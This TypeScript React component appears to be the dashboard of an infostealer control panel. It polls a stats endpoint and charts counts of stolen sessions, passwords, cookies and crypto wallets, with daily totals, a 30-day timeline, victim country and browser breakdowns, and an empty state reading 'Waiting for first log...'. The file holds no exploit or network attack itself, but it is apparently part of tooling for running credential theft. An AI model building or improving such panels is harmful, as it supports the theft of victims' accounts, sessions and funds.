import { useQuery } from '@tanstack/react-query'
import {
  AreaChart,
  Area,
  BarChart,
  Bar,
  PieChart,
  Pie,
  Cell,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  ResponsiveContainer,
} from 'recharts'
import { Monitor, Key, Cookie, Wallet, Inbox } from 'lucide-react'
import { api } from '@/lib/api'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Skeleton } from '@/components/ui/skeleton'

interface TimelineEntry {
  date: string
  count: number
}

interface GeoEntry {
  country_code: string
  country: string
  count: number
}

interface BrowserEntry {
  name: string
  count: number
}

interface Stats {
  totalSessions: number
  totalPasswords: number
  totalCookies: number
  totalWallets: number
  todaySessions: number
  todayPasswords: number
  todayCookies: number
  todayWallets: number
  timeline: TimelineEntry[]
  geo: GeoEntry[]
  browsers: BrowserEntry[]
}

const statCards = [
  { key: 'sessions', label: 'Sessions', icon: Monitor, totalKey: 'totalSessions' as const, todayKey: 'todaySessions' as const },
  { key: 'passwords', label: 'Passwords', icon: Key, totalKey: 'totalPasswords' as const, todayKey: 'todayPasswords' as const },
  { key: 'cookies', label: 'Cookies', icon: Cookie, totalKey: 'totalCookies' as const, todayKey: 'todayCookies' as const },
  { key: 'wallets', label: 'Wallets', icon: Wallet, totalKey: 'totalWallets' as const, todayKey: 'todayWallets' as const },
]

const CHART_COLORS = ['hsl(var(--chart-1))', 'hsl(var(--chart-2))', 'hsl(var(--chart-3))', 'hsl(var(--chart-4))', 'hsl(var(--chart-5))']

export default function Dashboard() {
  const { data, isLoading } = useQuery<Stats>({
    queryKey: ['stats'],
    queryFn: () => api.get<Stats>('/api/stats'),
    refetchInterval: 10000,
  })

  const hasData = data && data.totalSessions > 0

  if (isLoading) {
    return (
      <div className="space-y-6">
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
          {Array.from({ length: 4 }).map((_, i) => (
            <Card key={i}>
              <CardHeader className="pb-2">
                <Skeleton className="h-8 w-20" />
                <Skeleton className="h-4 w-24 mt-1" />
              </CardHeader>
              <CardContent>
                <Skeleton className="h-3 w-16" />
              </CardContent>
            </Card>
          ))}
        </div>
        <div className="grid gap-4 md:grid-cols-2">
          <Card>
            <CardHeader><Skeleton className="h-5 w-32" /></CardHeader>
            <CardContent><Skeleton className="h-[300px] w-full" /></CardContent>
          </Card>
          <Card>
            <CardHeader><Skeleton className="h-5 w-32" /></CardHeader>
            <CardContent><Skeleton className="h-[300px] w-full" /></CardContent>
          </Card>
        </div>
        <Card>
          <CardHeader><Skeleton className="h-5 w-40" /></CardHeader>
          <CardContent><Skeleton className="h-[300px] w-full" /></CardContent>
        </Card>
      </div>
    )
  }

  if (!hasData) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh] text-muted-foreground gap-4">
        <div className="rounded-full bg-muted p-4">
          <Inbox className="h-8 w-8" />
        </div>
        <p className="text-lg font-medium">No data yet</p>
        <p className="text-sm">Waiting for first log...</p>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
        {statCards.map((card) => {
          const Icon = card.icon
          const total = data![card.totalKey]
          const today = data![card.todayKey]
          return (
            <Card key={card.key}>
              <CardHeader className="flex flex-row items-center justify-between pb-2">
                <div>
                  <CardTitle className="text-3xl font-bold">{total.toLocaleString()}</CardTitle>
                  <CardDescription className="text-xs uppercase tracking-wider mt-1">{card.label}</CardDescription>
                </div>
                <div className="rounded-lg bg-muted p-2">
                  <Icon className="h-5 w-5 text-muted-foreground" />
                </div>
              </CardHeader>
              <CardContent>
                <p className="text-xs text-muted-foreground">
                  <span className="text-primary font-medium">+{today}</span> today
                </p>
              </CardContent>
            </Card>
          )
        })}
      </div>

      <div className="grid gap-4 md:grid-cols-2">
        <Card className="col-span-full md:col-span-1">
          <CardHeader>
            <CardTitle className="text-sm font-medium">Timeline (30 days)</CardTitle>
          </CardHeader>
          <CardContent>
            {data.timeline.length === 0 ? (
              <div className="flex items-center justify-center h-[300px] text-muted-foreground text-sm">
                No timeline data
              </div>
            ) : (
              <ResponsiveContainer width="100%" height={300}>
                <AreaChart data={data.timeline} margin={{ top: 5, right: 10, left: -10, bottom: 0 }}>
                  <defs>
                    <linearGradient id="timelineFill" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="0%" stopColor="hsl(var(--primary))" stopOpacity={0.15} />
                      <stop offset="100%" stopColor="hsl(var(--primary))" stopOpacity={0} />
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="hsl(var(--border))" vertical={false} />
                  <XAxis dataKey="date" tick={{ fontSize: 11 }} tickLine={false} axisLine={false} stroke="hsl(var(--muted-foreground))" />
                  <YAxis tick={{ fontSize: 11 }} tickLine={false} axisLine={false} stroke="hsl(var(--muted-foreground))" />
                  <Tooltip
                    contentStyle={{
                      background: 'hsl(var(--popover))',
                      border: '1px solid hsl(var(--border))',
                      borderRadius: 'var(--radius)',
                      fontSize: 13,
                    }}
                  />
                  <Area type="monotone" dataKey="count" stroke="hsl(var(--primary))" fill="url(#timelineFill)" strokeWidth={2} />
                </AreaChart>
              </ResponsiveContainer>
            )}
          </CardContent>
        </Card>

        <Card className="col-span-full md:col-span-1">
          <CardHeader>
            <CardTitle className="text-sm font-medium">Geo Distribution</CardTitle>
          </CardHeader>
          <CardContent>
            {data.geo.length === 0 ? (
              <div className="flex items-center justify-center h-[300px] text-muted-foreground text-sm">
                No geo data
              </div>
            ) : (
              <ResponsiveContainer width="100%" height={300}>
                <BarChart data={data.geo} layout="vertical" margin={{ top: 5, right: 10, left: 0, bottom: 0 }}>
                  <CartesianGrid strokeDasharray="3 3" stroke="hsl(var(--border))" horizontal={false} />
                  <XAxis type="number" tick={{ fontSize: 11 }} tickLine={false} axisLine={false} stroke="hsl(var(--muted-foreground))" />
                  <YAxis
                    dataKey="country_code"
                    type="category"
                    tick={{ fontSize: 11 }}
                    tickLine={false}
                    axisLine={false}
                    stroke="hsl(var(--muted-foreground))"
                    tickFormatter={(code) => `${code}`}
                    width={30}
                  />
                  <Tooltip
                    contentStyle={{
                      background: 'hsl(var(--popover))',
                      border: '1px solid hsl(var(--border))',
                      borderRadius: 'var(--radius)',
                      fontSize: 13,
                    }}
                  />
                  <Bar dataKey="count" fill="hsl(var(--chart-1))" radius={[0, 4, 4, 0]} barSize={20} />
                </BarChart>
              </ResponsiveContainer>
            )}
          </CardContent>
        </Card>
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="text-sm font-medium">Browser Distribution</CardTitle>
        </CardHeader>
        <CardContent>
          {data.browsers.length === 0 ? (
            <div className="flex items-center justify-center h-[300px] text-muted-foreground text-sm">
              No browser data
            </div>
          ) : (
            <div className="flex flex-col items-center">
              <ResponsiveContainer width="100%" height={300}>
                <PieChart>
                  <Pie
                    data={data.browsers}
                    dataKey="count"
                    nameKey="name"
                    cx="50%"
                    cy="50%"
                    innerRadius={70}
                    outerRadius={100}
                    strokeWidth={0}
                  >
                    {data.browsers.map((_, i) => (
                      <Cell key={i} fill={CHART_COLORS[i % CHART_COLORS.length]} />
                    ))}
                  </Pie>
                  <Tooltip
                    contentStyle={{
                      background: 'hsl(var(--popover))',
                      border: '1px solid hsl(var(--border))',
                      borderRadius: 'var(--radius)',
                      fontSize: 13,
                    }}
                  />
                </PieChart>
              </ResponsiveContainer>
              <div className="flex flex-wrap justify-center gap-4 mt-4">
                {data.browsers.map((b, i) => (
                  <div key={b.name} className="flex items-center gap-2 text-sm">
                    <div className="h-3 w-3 rounded-full" style={{ backgroundColor: CHART_COLORS[i % CHART_COLORS.length] }} />
                    <span className="text-muted-foreground">{b.name}</span>
                    <span className="font-medium">{b.count.toLocaleString()}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
}
